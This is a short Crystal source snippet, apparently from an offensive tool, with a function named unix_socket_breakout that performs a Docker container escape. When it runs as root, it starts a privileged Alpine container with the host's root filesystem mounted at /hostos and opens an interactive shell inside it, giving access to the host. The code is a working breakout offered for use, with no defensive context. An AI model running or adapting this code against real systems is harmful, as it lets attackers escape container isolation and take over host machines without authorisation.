
# this needs huge improvement

def unix_socket_breakout
  uid=LibC.getuid
  if uid == 0
    # should move to using http once crystal gets proper unix socket support. 
    docker_loc = docker_install
    puts `#{docker_loc} rm -f super_legit_docker_escape; #{docker_loc} run -i -t -d -v /:/hostos --privileged --name super_legit_docker_escape alpine /bin/sh`
    puts "We should have started a privileged container with the host OS filesystem mounted."
    puts "Let's try to start a shell inside that container"
    # am i really passing this input to the shell directly, you betcha
    system(docker_loc + " exec -i -t super_legit_docker_escape /bin/sh")
  else
    puts("Not root. Let's try to use Curl")
  end
  exit()
end